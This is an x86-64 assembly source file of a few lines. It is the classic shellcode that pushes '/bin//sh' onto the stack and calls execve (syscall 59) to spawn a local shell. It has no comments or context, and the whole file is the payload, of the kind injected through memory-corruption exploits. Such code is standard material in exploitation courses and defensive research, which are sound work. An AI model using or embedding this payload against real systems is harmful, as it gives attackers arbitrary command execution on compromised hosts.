global _start

section .text

_start:
	xor rax, rax
	mov rbx, 0x68732f2f6e69622f
	push rax
	push rbx
	mov rdi, rsp
	mov al, 59
	xor rsi, rsi
	xor rdx, rdx
	syscall
